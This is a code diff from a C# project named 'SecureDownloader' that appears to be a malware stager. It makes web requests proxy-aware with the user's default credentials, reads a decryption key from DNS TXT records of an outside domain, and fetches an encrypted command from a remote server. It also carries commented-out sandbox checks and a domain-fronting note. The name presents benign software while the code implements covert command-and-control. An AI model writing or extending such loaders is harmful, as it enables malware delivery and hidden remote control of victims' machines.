@@ -172,8 +172,9 @@ namespace SecureDownloader {
         public static string HttpGet(string URI) {
             WebClient client = new WebClient();
 
-            // Add a user agent header in case the 
-            // requested URI contains a query.
+            //proxy aware
+            client.UseDefaultCredentials = true;
+            client.Proxy = WebRequest.GetSystemWebProxy();
 
             Stream data = client.OpenRead(URI);
             StreamReader reader = new StreamReader(data);
@@ -190,8 +191,8 @@ namespace SecureDownloader {
             //SandboxCheck.izSafe();
 
             byte[] key = Encoding.ASCII.GetBytes(HelperFunctions.getTXTrecords("fda7hk2.concordiafunds.com")[0]);
-            string data;
-            var version = Environment.Version;
+            //string data;
+            //var version = Environment.Version;
             //if (version.Major >= 4) //domain fronting requires .NET 4.0 or higher
             //{
             //    data = HelperFunctions.HttpGet("https://secured.concordiafunds.com/appdata");
@@ -202,7 +203,7 @@ namespace SecureDownloader {
             //}
             //Environment.Exit(0);
 
-            data = HelperFunctions.HttpGet("https://secured.concordiafunds.com/data-nf");
+            string data = HelperFunctions.HttpGet("https://secured.concordiafunds.com/data-nf");
 
             byte[] iv = Convert.FromBase64String(data.Split(':')[0]);
             byte[] encryptedCmd = Convert.FromBase64String(data.Split(':')[1]);
